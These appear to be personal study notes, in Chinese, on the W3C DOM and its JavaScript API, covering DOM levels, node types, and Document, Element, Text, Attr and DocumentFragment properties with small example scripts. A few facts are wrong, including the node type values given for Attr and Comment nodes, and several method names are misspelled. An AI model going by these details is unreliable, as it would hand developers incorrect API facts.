DOM,Document Object Model 文档对象模型 
  PS:DOM的标准由W3C组织规定 
    DOM 是为了操作文档出现的 API,document 是其的一个对象；
    DOM不是专为HTML设计的,是通用型的标准,为所有标记语言而设计 .
    并不是只有JavaScript有DOM API,其他的程序设计语言如Java也有对应的DOM API.
    浏览器对html文件的描述方式.
    给文档提供了一种结构化的表示方法,可以改变文档的内容和呈现方式 .
    DOM是给HTML和XML文件使用的一组API.它提供了文件的结构表述,让你可以改变其中的內容.
    DOM是将整个html文件、标签看成一个由对象组成的树.
    每个DOM最上面都有一个document对象,然后是html及其他元素.
    document 表示浏览器中的整个页面,包含完整的DOM.
    IE中所有DOM对象都是以COM对象的形式实现的,使用object来表示获取到的元素.
    意味着IE中DOM对象与原生JS对象有差异.
    对DOM的任何修改都会在浏览器呈现DOM时立即反映出来.
  W3C DOM 标准
    分为 3 个不同的部分
    DOM core,DOM核心:   针对任何结构化文档的标准模型
    XML DOM:            针对 XML 文档的标准模型
    HTML DOM:           针对 HTML 文档的标准模型
      HTML的标准编程接口,关于如何获取、修改、添加或删除 HTML 元素的标准
      HTML 文档中的所有内容都是节点：
      整个文档是一个文档节点
      每个 HTML 元素是元素节点
      HTML 元素内的文本是文本节点
      每个 HTML 属性是属性节点
      注释是注释节点
  DOM标准的目标
    让“任何一种程序设计语言”能操控使用“任何一种标记语言”编写出的“任何一份文档”
    “操控”具体含义为能通过DOM提供的API对文档的内容、结构、样式进行访问和修改
  DOM API 介绍
    用于操作DOM的API
    浏览器提供给JavaScript操作html页面内元素的方式.
    浏览器提供了一些内置函数来让我们操作页面.
  DOM 模块和级别(DOM Level 1/2/3)
    DOM XML ：只针对XML文档的标准模型
    DOM0级(实际上,DOM0级标准是不存在的)
     所谓的DOM0级是DOM历史坐标中的一个参照点而已,
     具体说呢,DOM0级指的是IE4和Netscape 4.0 这些浏览器最初支持的DHTML
     大概2000年的时候争论过DOM0的问题,最后结论大概是,没有官方形成此标准.
    DOM1级(DOM Level1)
      PS:于1998年10月成为W3C的推荐标准
        主要目标是映射文档的结构
        DOM1级由两个模块组成
      DOM核心(DOM Core)
        针对任何结构化文档的标准模型
        规定如何映射基于XML的文档结构,以便简化对文档中任意部分的访问和操作
      DOM HTML
        只针对HTML文档的标准模型
        DOM HTML模块则在DOM核心的基础上加以扩展,添加了针对HTML的对象和方法
    DOM2级
      PS:扩充了(DHTML一直都支持的)鼠标和用户界面事件、范围、遍历(迭代DOM文档的方法)等细分模块,
        通过对象接口增加了对 CSS 的支持
        DOM1级中的DOM核心模块也经过扩展开始支持XML命名空间
        也引入了新模块,也给出了众多新类型和新接口的定义
      DOM2级核心:在1级的基础上添加了更多的方法和属性
      DOM视图(DOM Views)：定义了跟踪不同文档(例如,应用CSS之前和之后的文档)视图的接口；
      DOM事件(DOM Events)：定义了事件和事件处理的接口；
      DOM样式(DOM Style)：定义了基于CSS为元素应用样式的接口；
      DOM遍历和范围(DOM Traversal and Range)：定义了遍历和操作文档树的接口
      DOM2级HTML:在1级的基础上添加了更多的属性、方法和接口
    DOM3级
      PS:进一步扩展DOM, 新增了验证文档的方法–在DOM验证(DOM Validation)模块中定义
        对DOM核心进行了扩展,开始支持XML 1.0 规范,涉及XML Infoset、XPath和XML Base
      // 新增模块
      "XPath"模块:
      Load and Save 模块:
    其他DOM标准
      除了DOM核心和DOM HTML接口之外,另外几种语言还发布了只针对自己的DOM标准
      下面列出的语言都是基于XML的,每种语言的DOM标准都添加了与特定语言相关的新方法和新接口：
      SVG(Scalable Vector Graphic,可伸缩矢量图)1.0；
      MathML(Mathematical Markup Language,数学标记语言)1.0；
      SMIL(Synchronized Multimedia Integration Language,同步多媒体集成语言)
    还有一些语言也开发了自己的DOM实现
      例如Mozilla的XUL(XML User Interface Language,XML用户界面语言)
      但是,只有上面列出的几种语言是W3C的推荐标准
    DOM模块版本检测
      可使用 document.implementation.hasFeature() 方法来检测(详见: Document)
◆Node 节点 
  PS:DOM可将任何HTML或XML文档描绘成一个由多层节点构成的结构
    节点分为几种不同的类型,每种类型分别表示文档中不同的信息或标记
    每个节点都有自己的特点、数据和方法,也与其他节点间存在关系
    整个HTML文档可以表示为以一个特定节点为根节点的树形结构
    文档节点就是文档的根节点,根节点只有一个子节点即 <HTML>元素
    <HTML>元素,也被称为文档元素,文档元素是文档的最外层元素.
    DOM1 定义了 Node 接口,用于实现DOM中所有节点
    Node 接口作为Node类型实现.(除IE外所有浏览器可访问到Node类型)
    JS中所有节点类型都继承自Node类型,都有一个 nodeType 属性表明节点的类型
    并非所有节点类型都受到Web浏览器的支持,最常用的节点类型为 元素节点 和 文本节点
    后续使用 nod 来表示一个 Node类型 的实例 (SelfSet)
    文档中所有的节点之间都存在着关系,同一类型节点间的关系可类比为家族关系,
    HTML 的子元素中有 body,body 的同胞元素有 head ... 等等
    虽然所有节点类型都继承自Node,但并非每种节点都有子节点.
  nod.nodeType  节点类型「共12种」
    PS:IE中不可使用如 Node.DOCUMENT_NODE 来进行判断「IE没有公开Node类型的构造函数」,
      为跨浏览器兼容,最好将nodeType属性与数值 1-12 进行比较.
    Node.DOCUMENT_NODE     9,文档的根节点
    Node.ELEMENT_NODE      1,元素节点 
    Node.TEXT_NODE         3,文本节点,元素的文本内容
    Node.PROCESSING_INSETUCTION_NODE; 7,文档处理程序使用的特有指令
    Node.COMMENT_NODE;     8,注释节点,表示一个注释,形式为<!-- comment text -->
    Node.DOCUMENT_TYPE_NODE;       10,文档类型的定义
    Node.DOCUMENT_FRAGMENT_NODE;   11,文档片段
    DOM4已弃用的节点类型
      Node.ATTRIBUTE_NODE;  // 2,元素的耦合属性
      Node.CDATA_SECTION_NODE;  // 4,在XML文档中表示Character Data(字符数据)部分
      Node.ENTITY_REFERENCE_NODE; // 5,表示一个实体引用
      Node.ENTITY_NODE;  // 6,在XML文档中表示一个实体
      Node.NOTATION_NODE; // 12,在XML文档中表示一个符号
    e.g. :  document.nodeType == Node.DOCUMENT_NODE;  // true
  nod.nodeName  节点名称「不同类型节点返回的形式不同」
    元素节点返回大写字母表示的元素名称; 属性节点返回属性名称; 文本节点返回 #text;
  nod.nodeValue;  值(具体定义取决于节点的类型)
    元素节点无value值,返回null;
    属性节点返回属性值;
    文本节点返回文本内容(不包含html)
  nod.attributes; 获取当前元素节点的所有属性节点集合数组
    使用下标访问属性节点,遍历时是从后向前的.
    使用属性名直接得到对应的属性节点
    e.g. box.attributes['title']
  ◆节点关系类
  nod.childNodes; 返回值为 NodeList 类数组对象,保存着一组有序的节点
    当nod为元素节点时,其子节点有可能是元素、文本节点、注释或处理指令.
      且不同的浏览器在看待这些节点方面存在显著的不同
    NodeList 是动态实时的,DOM 改变后 NodeList 也会变化
    可以通过[]下标法或 item() 方法来访问节点
      nod.childNodes[0];
      nod.childNodes.item(0);
    nod.childNodes.length;  节点的个数
  nod.parentNode; 父节点
  nod.previousSibling; 前一个兄弟节点(第一个节点的该属性为null)
  nod.nextSibling;     后一个兄弟节点(最后一个节点的该属性为null)
  nod.firstChild;    第一个子节点(若没有子节点则为null)
  nod.lastChild;     最后一个子节点(若没有子节点则为null)
  nod.ownerDocument;   表示整个文档的文档节点即document
  ◆节点操作
  Nod.hasChildNodes(nod); 是否包含节点
  Nod.appendChild(nod); 在父节点 Nod 内的最后位置添加一个子节点 nod
    若子nod为文档中的节点,则是移动操作(原位置消失,在插入位置出现)
  Nod.insertBefore(INnod,BEnod); Nod内BEnod前插入INnod,返回值为INnod
    若BEnod为null,则等同于appendChild
  insertAfter 无该API
  Nod.replaceChild(NEWnod,OLDnod); Nod内替换OLDnod为NEWnod,返回值为OLDnod
  Nod.removeChild(nod); 删除子节点nod,并返回
  ◆其他操作
  nod.cloneNode(bool);   复制节点(但未添加到文档结构中)
    PS:不会复制节点中JS添加的属性(如事件等),只复制特性.
      IE中存在bug会复制事件处理程序,可以通过复制前移除事件来决解.
    bool 一个布尔值
      true  深复制,复制节点及其整个子节点树
      false 浅复制,只复制节点本身(只有标签)
  isSupported(); 和 document.implementation.hasFeature();方法类似
    Arguments: 接受两个参数 特性名和特性版本号
    RetValue:返回值为布尔值
    存在和document.implementation.hasFeature();同样的问题,测试不一定准确
  nod1.isSameNode(nod2);  返回布尔值表示两个节点是否相同 (DOM3级新增)
    相同指的是两个节点引用的是同一个对象
  nod1.isSameNode(nod2);  返回布尔值表示两个节点是否相等 (DOM3级新增)
    相等指的是两个节点是相同的类型,具有相等的属性(如nodeName),
    且attributes和childNodes属性也相等.
  nod.setUserData(键名,数据值(任何类型),处理函数); 给一节点添加额外数据
    处理函数接收5个参数:
      num 表示操作类型的数值(1 表示复制,2 导入,3 删除,4 重命名)
      数据键
      数据值
      原节点    在删除节点时,原节点是null
      目标节点  在复制节点时,目标节点是null
    e.g. :
    设置与获取额外数据
    document.body.setUserData("aoo","boo",function(){});
    var aoo =document.body.getUserData("aoo");
类型&详解 
  Document 文档根节点
    PS: JS中通过 Document 类型表示文档.
      document 对象是 HTMLDocument(继承自Document类型)的一个实例.
      表示整个 HTML 页面.
      document 对象也是window对象的一个属性,因此可以作为全局对象来访问
    ◆节点属性
      document.nodeType;       // 9
      document.nodeName;       // "#document"
      document.nodeValue;      // null
      document.parentNode;     // null
      document.ownerDocument;  // null
    ◆作为 HTMLDocument 实例的属性
      document.documentElement; 表示 <html>元素
        document.documentElement.clientWidth;  获取视口的宽度
        document.documentElement.clientHeight; 获取视口的宽度
        document.documentElement.textContent;  获取整个文档的文本以及CDATA数据
      document.body; 表示<body>元素,得到body标签及其包含的所有内容
        document.body === document.querySelector("body"); // true
        「其他属性详见 DOM操作归纳总结->elem」
      document.title; 取/设网页标题,类型为字符串
        e.g. :
        PS-Self:通过中间量赋值方法更改网页标题失败
        var a = document.title;
        a = "hello";
        结果:操作失败,网页标题未变化;
        分析:第一步是将a指向网页标题,第二步将a执行'hello';纯属逻辑错误
        改为
        var a = "hello";
        document.title =a;
      document.URL; 获取完整的URL,类型为字符串
        返回值如:"https://www.baidu.com/"
      document.domain; 获取域名.类型为字符串(详见: JS高级程序设计 256 页)
        返回值如:"www.baidu.com"
      document.referrer; 获取跳转页的URL,即获取从哪个网址跳转过来的
        PS:若当前文档不是通过超级链接访问的,则为 ''。
          这个属性允许客户端 JavaScript 访问 HTTP 引用头部。
      document.doctype; 表示文档类型,取得对<!DOCTYPE>的引用
        浏览器对该属性的支持差别很大,因此用处很有限

      (更多内容详见 JavaScript高级程序设计 317 页)
      document.styleSheets; 返回页面所有 StyleSheet 对象的 StyleSheetList
        PS:StyleSheetList 即所有样式表的集合
      var sheet =document.styleSheets[0]; 表示一个样式表对象
        <link>节点和<style>节点的sheet属性,也可以获取 StyleSheet 对象,
          如 document.querySelector("link[rel=stylesheet]").sheet
          CSSStyleSheet 类型(表示通过<link>和在<style>中定义的样式表)
          <link>元素包含的样式由 HTMLLinkElement 类型表示
          <style>元素包含的样式由 HTMLStyleElement 类型表示
        sheet.disabled  用于打开或关闭一张样式表,值为true或disabled
          一旦样式表设置了disabled属性,这张样式表就将失效
        sheet.href  只读,返回样式表链接的地址
          对于内嵌的style节点,该属性等于null；
        sheet.media  只读,默认值是screen；
          表示这个样式表是用于屏幕(screen),还是用于打印(print),或两者都适用(all)
        sheet.ownerNode 返回对象所在的DOM节点,通常是<link>或<style>
          对于那些由其他样式表引用的样式表,该属性为null
        sheet.parentStyleSheet
          因为CSS的@import命令允许在样式表中加载其他样式表,就有了parentStyleSheet属性,
          它返回包括了当前样式表的那张样式表.
          如果当前样式表是顶层样式表,则该属性返回null
        sheet.title  返回StyleSheet对象的title值；
        sheet.type  返回StyleSheet对象的type值,通常是text/css
        sheet.insertRule(str,index)  向样式表中插入一条新规则 [IE9-为addRule]
          PS:
          Arguments:
            str   表示CSS规则的字符串
            index 插入位置
          e.g.: document.styleSheets[0].insertRule('#block { color:white }', 0);
        sheet.deleteRule(index); 从样式表中删除一条规则 [IE9-使用removeRule]
          PS:
          e.g.:document.styleSheets[0].deleteRule(0); //删除样式表中的第一条规则
      document.styleSheets[0].cssRules; 返回 CSSRuleList [IE9-为rules]
        PS:CSSRuleList 为样式表的CSS规则组成的类数组对象
      var rule =document.styleSheets[0].cssRules[0]; 表示样式表的一条规则
        PS:一条CSS规则包括两个部分：CSS选择器和样式声明
          CSSRule 对象表示样式表中的一条规则,是一个供其他多种类型继承的基类型,
          其中常见的就是 CSSStyleRule 类型
        rule.selectorText; 返回当前规则的选择器
          e.g.:document.styleSheets[0].cssRules[0].selectorText; // ".myClass"
        rule.style;   规则样式声明,即选择器大括号内的部分
          e.g.:
          document.styleSheets[0].cssRules[0].style.color = 'red';
        rule.cssText; 返回该规则的字符串表示
          // "body { background-color: red; margin: 20px; }"
        rule.parentStyleSheet; 返回定义当前规则的样式表对象
        rule.parentRule; 返回包含当前规则的那条CSS规则
          如果当前规则是顶层规则,则该属性返回null.
        rule.media; [当一条规则为@media代码块]返回@media代码块的media规则
        e.g.:
          假设这条规则位于页面中的第一个样式表中,且样式表中只有这一条规则
          div.box{ background-color:blue; width:100px; }
          var sheet =document.styleSheets[0];
          var rules =sheet.cssRules || sheet.rules;  // 取得规则列表,兼容写法
          var rule =rules[0];
          console.log(rule.selectorText);          // "div.box"
          console.log(rule.style.cssText);         // 完整的CSS代码
          console.log(rule.style.backgroundColor); // "blue"
          console.log(rule.style.width);           // "100px"
          rule.style.backgroundColor ="red";  // 设置背景色

          document.styleSheets[0].cssRules[0].selectorText; //返回选择器字符串
          document.styleSheets[0].cssRules[0].cssText; //返回规则字符串,含选择器
          document.styleSheets[0].cssRules[0].style.border;
          document.styleSheets[0].cssRules[0].style.cssText; //返回当前规则的所有样式声明字符串

      document.getElementById("idname");   通过id获取元素对象
        返回值为HTMLDivElement对象,若不存在返回null.
      document.getElementsByTagName("tagname");  返回一 HTMLCollection 
        HTMLCollection与NodeList非常类似,也是动态的(随着DOM的改变也会相应的变化)
        使用[]下标访问;或使用 items(num)方法(num为下标,该方式使用较少)
          在[]中传入数值,则后台就会调用items()方法
          []中也可传入字符串,则调用namedItem()方法
        htmlcollection.namedItem("namevalue"); 获取htmlcollection中name属性值为namevalue的项
        e.g.
        document.getElementsByTagName('div')
        获取所有标签
        document.getElementsByTagName('*')
        获取当前html中所有元素对象的一个数组.
      document.getElementsByName("namevalue");   返回一 HTMLCollection 
        HTMLCollection包含所有name值为namevalue的元素
        一般用于获取单选按钮
        IE中若该元素本身不包括name属性(但自行添加了),获取时会获取不到
      document.defaultView  表示当前document对象所关联的window对象,若没有返回null
        DOM2级视图模块 添加的一个属性
        IE不支持该属性,有一个 document.parentWindow 属性和其等价
      document.defaultView.getComputedStyle(elem,str) 返回CSSStyleDeclaration
        PS:等价于 window.getComputedStyle(elem,str/null);
          表示实际应用在指定元素上的最终样式信息,即各种CSS规则叠加后的结果.
          CSSStyleDeclaration对象中包含当前元素的所有计算的样式
        Arguments:
          str 为一伪元素字符串(如":after"),若不需要可为null或''
            IE不支持获取伪类 [?]
        e.g.:
          var color = window.getComputedStyle(elm, ':before').color;
          var color = window.getComputedStyle(elm, ':before')
          .getPropertyValue('color');
          var color = window.getComputedStyle(elm, null).color;
        IE9以下不支持defaultView,使用 elem.currentStyle 属性代替 [非标准属性]
          这个属性是CSSStyleDeclaration的实例
        计算样式的 CSSStyleDeclaration 对象与内联样式的 CSSStyleDeclaration 对象的区别
          计算样式的属性是只读的；
          计算样式的值是绝对值,类似百分比和点之类相对的单位将全部转换为以'px'为后缀的字符串绝对值,
          其值是颜色的属性将以“rgb(#,#,#)”或“rgba(#,#,#,#)”的格式返回;
          不计算复合属性,只基于最基础的属性,如不要查询margin,而单独查询marginTop等;
          计算样式对象未定义cssText属性；
          计算样式同时具有欺骗性,在查询某些属性时的返回值不一定精准,如查询font-family；
    ◆五个快捷 HTMLCollection 对象
      document.forms; 文档中所有的<form>元素
      document.images; 文档中所有的<img>元素
      document.links; 文档中所有带href特性的<a>元素
      document.anchors; 文档中所有带name特性的<a>元素
      document.applets; 文档中所有的<applet>元素,已经几乎不用了
       (因为不再推荐使用该元素所以该集合已经不建议使用了)
    ◆创建
      document.createElement(tagName[,options]); 返回创建的元素对象
        PS:只是创建了一个元素,还没添加到html中,驻留在内存中
          只是创建了一个空元素(只有标签),无属性和内容(?)
          当指定未定义的元素时,创建一个HTMLUnknownElement
        Arguments:
          tagName 指定将要创建的元素类型的字符串.
            创建的element的nodeName会被初始化为tagName的值.
            该方法不接受带条件的元素名字(例如: html:a).
          options 是一个可选的 ElementCreationOptions 对象.
            如果这个对象被定义并赋予了一个 is 特性,
            则创建的element的 is 属性会被初始化为这个特性的值.
            如果这个对象没有 is 特性,则值为空.
        IE中可传入HTML代码来创建HTML元素
          e.g. :
          var div =document.createElement("<div class="a" id="b"></div>");
      document.createTextNode("文本");  创建一个文本节点
      document.createCommnet("文本");   创建一个注释节点
      document.createDocumentFragment("文本");   创建文档片段
      document.createAttribute("特性名");   创建特性节点
        在创建时已经确定了特性的name,后续不需再赋值
      document.importNode(nod,bool); 复制插入节点(HTML中不常用,XML中常用)
        PS:将外部文档的一个节点拷贝一份,然后可以把这个拷贝的节点插入到当前文档中
          源节点不会从外部文档中删除,被导入的节点是源节点的一个拷贝.
        e.g.:
        var iframe = document.getElementsByTagName("iframe")[0];
        var oldNode = iframe.contentDocument.getElementById("myNode");
        var newNode = document.importNode(oldNode, true);
        document.getElementById("container").appendChild(newNode);
    ◆文档写入
      document.write(str); 在网页上输出字符串
        可以使用该方法动态的包含外部资源,比如JavaScript文件
          注意不能在字符串中直接包含"</script>",否则会导致被解析为脚本块的结束
        e.g.
        document.write()输出内容和前面内容的输出关系.
        清空原网页输出
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="utf-8">
            <meta name="author" content="http://www.softwhy.com/" />
            <title>蚂蚁部落</title>
            <script type="text/javascript">
              window.onload = function() {
                document.write("分享互助");
              }
            </script>
          </head>
          <body>
            <div>蚂蚁部落欢迎您</div>
          </body>
          </html>
          执行以上代码,document.write()函数将原来的文档内容清空了
          window.onload 事件是在文档内容完全加载完毕再去执行事件处理函数
          当执行document.write()时文档流已经关闭了
          而执行doucment.writ()函数会自动调用document.open()函数创建一个新的文档流,并写入新的内容,再通过浏览器展现
          故产生了覆盖
        叠加输出
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="utf-8">
            <meta name="author" content="http://www.softwhy.com/" />
            <title>蚂蚁部落</title>
            <script type="text/javascript">
              document.write("分享互助");
            </script>
          </head>
          <body>
            <div>蚂蚁部落欢迎您</div>
          </body>
          </html>
          原文档内容没有被清空
          document.wirte()函数身处其中,即执行此函数的时候文档流并没有被关闭,
          这个时候不会调用document.open()函数创建新文档流,所以未覆盖
        叠加输出
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="utf-8">
            <meta name="author" content="http://www.softwhy.com/" />
            <title>蚂蚁部落</title>
            <script type="text/javascript">
              document.close();
              document.write("分享互助");
            </script>
          </head>
          <body>
            <div>蚂蚁部落欢迎您</div>
          </body>
          </html>
          上面使用document.close()关闭文档流了而未产生覆盖,
          因为文档流是由浏览器创建,无权限手动关闭(只能等其加载完后自动关闭)
          document.close()函数只能够关闭由document.open()函数创建的文档流
        清除前面的输出
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="utf-8">
            <meta name="author" content="http://www.softwhy.com/" />
            <title>蚂蚁部落</title>
            <script type="text/javascript">
              function create() {
                var newWindow = window.open("", "蚂蚁部落", "_blank");
                newWindow.document.write("蚂蚁部落欢迎您");
                newWindow.document.close();
                newWindow.document.write("ABC");
              }
              window.onload = function() {
                var obt = document.getElementById("bt");
                obt.onclick = function() {
                  create();
                }
              }
            </script>
          </head>
          <body>
            <div id="print">蚂蚁部落欢迎您,只有努力奋斗才会有美好的明天 </div>
            <input type="button" id="bt" value="查看效果" />
          </body>
          </html>
          doucment.open()创建的文档流就可以由document.close()函数关闭
          第二个document.write()输出的内容会覆盖掉第一个输出的内容
      document.writeln(str); 同write相同,会在字符串的末尾添加一个换行符(\n)
      document.open();
      document.close();
    ◆DOM 功能检测
      document.implementation;  返回 DOMImplementation 对象
        hasFeature(feature,version); 返回布尔值
          DOM1级只为 document.implementation 规定了这一个方法
          返回值为Boolean值,支持则为true,否则为false
          检测结果有时候不正确
           (如 safari2.x 及更早版本会返回true,即使没有完全实现某些DOM功能)
          Arguments:
            feature 要检测的DOM功能的名称
            version DOM的版本号
            e.g. :
            Core        1.0 2.0 3.0 基本的DOM,用于描述表现文档的节点树
            XML         1.0 2.0 3.0 Core的XML扩展,添加了对CDATA、处理指令及实体的支持
            HTML        1.0 2.0     XML的HTML扩展,添加了对HTML特有元素及实体的支持
            Views       2.0         基于某些样式完成文档的格式化
            StyleSheets 2.0         将样式表关联到文档
            CSS         2.0         对层叠样式表1级的支持
            CSS2        2.0         对层叠样式表2级的支持
            Events      2.0 3.0     常规的DOM事件
            UIEvents    2.0 3.0     用户界面事件
            MouseEvents 2.0 3.0     由鼠标引发的事件
            MulationEvents 2.0 3.0  DOM树变化时引发的事件
            HTMLEvents  2.0         HTML 4.01 事件
            Range       2.0         用于操作DOM树中某个范围的对象和方法
            Traversal   2.0         遍历DOM树的方法
            LS          3.0         文件与DOM树之间的同步加载和保存
            LS-Async    3.0         文件与DOM树之间的异步加载和保存
            Validation  3.0         在确保有效的前提下修改DOM树的方法
          e.g.
          document.implementation.hasFeature("CSS","2.0")
          document.implementation.hasFeature("CSS2","2.0")
          document.implementation.hasFeature("HTML","1.0")
      document.implementation.createDocumentType(); 创建HTML5之前的doctype相关
      document.implementation.createDocument(); 创建新文档
      document.implementation.createHTMLDocument(titlename); 创建一个完整的HTML文档
        包括 <html> <head> <title> <body>元素
        传入的参数为放在<title>元素中的字符串
        通过该方法创建的文档时 HTMLDocument 类型的实例
        只有Opera和Safari支持该方法
  Element 类型:    元素节点
    PS:Element 类型用于表现XML或HTML元素,提供了对元素标签名、子节点即特性的访问
      除了 Document 类型之外,Element 类型算是Web编程中最常用的类型了.
    ◆节点属性
    elem.nodeType;   节点类型值为1
    elem.nodeName;   节点名称为元素的标签名
      等价于 elem.tagName;
      因为返回标签名的字符串存在大小写的问题,推荐的做法为统一转换为小写字符在做比较
      e.g. : elem.tagName.toLowerCase() == "div";
    elem.nodeValue;  节点值为 null
    elem.parentNode;  父节点可能是 Document 或其他 elem
    其子节点可能是:
      Element Text Comment ProcessingInstruction
      CDATASection EntityReference
  HTMLElement 类型:直接继承自 Element 并添加了一些属性
    PS:可以直接通过 == 来比较「不同于ECMAScript中的对象」「SelfPoint」
      所有HTML元素都有 HTMLElement 类型表示.
      e.g. :
      div 为 HTMLDIVElement;
      p 为 HTMLParagraphElement;
      span 为 HTMLElement;
      i 为 HTMLElement;
    ◆
    elem.id     元素在文档中的唯一表示符
    elem.title  有关元素的附加说明信息,一般通过工具提示条显示出来
    elem.lang   元素内容的语言代码,很少使用
    elem.dir    语言的方向,也很少使用
      "ltr"   left-to-right 从左至右
      "rtl"   right-to-left 从右至左
    elem.className 元素的CSS类,返回值为class值的字符串
    ◆读写元素任何特性
    elem.getAttribute("属性名");  返回属性值
      e.g. :
      获取 class类
      elem.getAttribute("class/className");
      IE使用class,其他浏览器使用className(?)
    elem.属性名;   任何元素的所有特性也都可以通过DOM元素本身的属性来访问
      不过,只有公认的(非自定义的)特性才会以属性的方式添加到DOM对象中
    elem.style;  返回一(内联)样式对象(CSSStyleDeclaration 的实例)
      PS:包含着通过HTML的style特性指定的所有样式信息,
        不包括外部样式表或嵌入样式表的样式.
        在style中指定的任何CSS属性都将表现为这个style对象的相应属性.
        对于使用短划线(如background-color)的CSS属性,需改写为驼峰形式才能访问,
        只有一个不能直接使用转换的CSS属性访问就是float,因为float为JS保留字,
        DOM2级 规定使用cssFloat 代替,IE则使用styleFloat.
        若没有为元素设置style特性,即无嵌入样式,则style中可能会包含一些并不准确的默认值
        style对象的属性值都是字符串,设置时必须包括单位.
        elem.getAttribute("style"); 得到相应的代码字符串
      elem.style.XX   读写指定的行内样式
      elem.style.cssText; 取/设style特性中的CSS代码
        可以读写或删除整个样式
        e.g.:
        elem.style.cssText ='background-color:red;'+'border:1px solid black;';
      elem.style.length; CSS属性的数量
      elem.style.parentRule; CSS信息的CSSRule对象
      elem.style.getPropertyPriority(属性名); 返回优先级声明,存在为"important",否则为""
      elem.style.getPropertyCSSValue(属性名); 返回包含指定属性的CSSValue对象
      elem.style.getPropertyValue(属性名); 返回指定属性的字符串值
      elem.style.setProperty(属性名,value,"!import"/""); 设置属性及值,并加上"!important"或""
      elem.style.removeProperty(属性名);   从样式中删除指定属性;
      elem.style.item(index);   返回指定位置的CSS属性的名称(使用[]也同样可以)
      element.style.webkitAnimationPlayState
        animation-play-state属性可以控制动画的状态,暂停/播放,需加上浏览器前缀
        "paused"    暂停
        "running"   播放
      e.g.:
        elm.style.color = 'black';
        elm.style.cssText ='color:red;line-height:30px';
        elm.style.removeProperty('color');
        elm.style.setProperty('color', 'green', 'important');
    elem.runtimeStyle; 计算的样式 [仅IE6支持,非标准]
    elem.onEvents; 返回相应的JS函数
      如 elem.onclick;等类似的事件处理程序
      elem.getAttribute("onclick"); 得到相应的代码字符串
    elem.attributes; 返回 NamedNodeMap 对象,与NodeList类似,也是一个"动态"集合
      PS:元素的每一个特性都由一个Attr节点表示,每个节点都保存在 NamedNodeMap 对象中
        NamedNodeMap中节点的nodeName就是特性的名称,nodevalue就是特性的值
      elem.attributes.getNameItem(str); 返回nodeName为str的节点
      elem.attributes.setNameItem(nod); 向列表中添加nod特性节点
      elem.attributes.removeNameItem(str); 从列表中移除nodeName为str的节点,并返回删除的节点
      elem.attributes.item(num); 返回位于num位置处的节点
      e.g. :
      获取元素的id值
      var id =elem.attributes.getNameeItem("id").nodeValue;
      设置元素的id值
      elem.attributes.["id"].nodeValue = "xxx";
    elem.setAttribute("属性名","属性值"); 设置特性,若特性存在则修改,否则创建
      使用元素属性方法来自定义属性不起作用,如div.mycolor ="red"; 需使用setAttribute方法
      e.g.
        document.getElementById("box").setAttribute("align","center");
        document.getElementById("box").setAttribute("style","color:green");
        elem.setAttribute("contenteditable","true");
        添加内置样式表
        var style = document.createElement('style');
        style.setAttribute('media', 'screen');
        // 或者
        style.setAttribute("media","@media only screen and(max-width:1024px)");
    elem.removeAttribute("属性名"); 删除属性及属性值
  Text 类型:       文本节点
    PS:没有子节点
    元素节点和文本节点的关系
      e.g. :
      <div></div>  <!-- 没有内容,没有文本节点 -->
      <div> </div>  <!-- 有空格,有一个文本节点 -->
      <div>hello word</div>  <!-- 有内容,有一个文本节点 -->
      则该文本节点为元素节点的第一个子节点
      var tex =div.firstChild;
    ◆节点属性
    tex.nodeType;  节点类型为3
    tex.nodeName;  节点名为 "#text"
    tex.nodeValue; 节点值为所包含的文本
      修改文本值时,字符串的特殊字符会被转码
      e.g. :
      div.firstChild.nodeValue ="1 <strong> 2 </strong> 3";
      // 输出结果为 "1 &lt;strong&gt; 2 &lt;/strong&gt; 3"
    tex.parentNode; Element
    ◆Text 对象属性
    tex.data; 取/设文本,等价于nodeValue
    tex.appendData(tex1); 将tex1添加到节点的末尾
    tex.deleteData(begin,num); 从begin的位置开始删除num个字符
    tex.insertData(offset,tex1); 在offset的位置插入tex1
    tex.replaceData(offset,num,tex1); 用tex1替换从offset的位置后到的num个文本
    tex.substringData(offset,num);  返回从offset位置开始的num个字符串
    tex.length;  字符数量; 等价于nodeValue.length 或 data.length
    nod.normalize(); 合并同一级别的文本节点
      浏览器在解析文档时不会创建相邻的文本节点
      当在一个元素节点中相邻添加多个文本节点时,外观上是合并在一起,访问时仍是保持独立的
    tex.splitText(num); 原文本节点将包含从开始的num个字符,新文本节点将包含剩下的文本
  Attr 类型:       元素的属性节点
    PS:元素的特性在DOM中以Attr类型表示,不被认为是DOM文档树的一部分
    ◆Node 属性
    nodeType 的值为11;
    nodeName 的值为 特性的名称
    nodeValue 的值为 特性的值
    parentNode 的值为 null
    子节点 HTML中不支持(没有)子节点;XML中可以为 Text 或 EntityReference
    一般使用 getAttribute setAttribute removeAttribute 方法,很少直接引用特性节点
    ◆Attr对象属性
    att.name;  与nodeName的值相同
    att.value; 与nodeValue的值相同
    att.specified; 返回布尔值,用于区别特性是自行添加的还是默认的
    ◆特性添加 获取
    elem.setAttributeNode();将创建的特性添加到元素中
    elem.getAttributeNode();获取元素的特性
  Comment 类型:    注释节点
    Node属性
    comm.nodeType;  节点类型为 3
    comm.nodeName;  节点名为 "#comment"
    comm.nodeValue; 节点值为注释的内容
    comm.parentNode; Document 或 Element
    Comment类型和Text类型继承自相同的基类,拥有除splitText之外的所有字符操作方法
    不支持(没有)子节点
  DocumentType 类型:     文档声明
    DocumentType 类型在Web浏览器中并不常见,仅有firefox safari opera 支持
    nodeName 为doctype的名称
    publicId 获取HTML5之前的doctype声明中的部分信息
    systemId 获取HTML5之前的doctype声明中的部分信息
    internalSubset 获取HTML5之前的doctype声明中某些信息
  DocumentFragment 类型: 文档片段,document fragment
    PS:在所有节点类型中,只有 DocumentFragment 在文档中没有对应的标记
      一种 "轻量级"的文档,可以包含和控制节点,
      但不会像完整的文档那样占用额外的资源.
      不能把文档片段直接添加到文档中,但可以将他作为一个"仓库"来使用,
      即可以在里面保存将来可能会添加到文档中的节点.
      文档片段继承了Node的所有方法,通常用于执行那些针对文档的DOM操作.
      若将文档中的节点添加到文档片段中,就会从文档树中移除该节点.
      添加到文档片段中的新节点同样也不属于文档树.
      可以通过appendChild 或 insertBefore将文档片段中内容添加到文档中,
      将文档片段作为参数传递给这两个方法时,则会将其所有子节点添加到文档中.
    ◆node节点属性
    nodeType 的值为11;
    nodeName 的值为 "#document-fragment"
    nodeValue 的值为 null
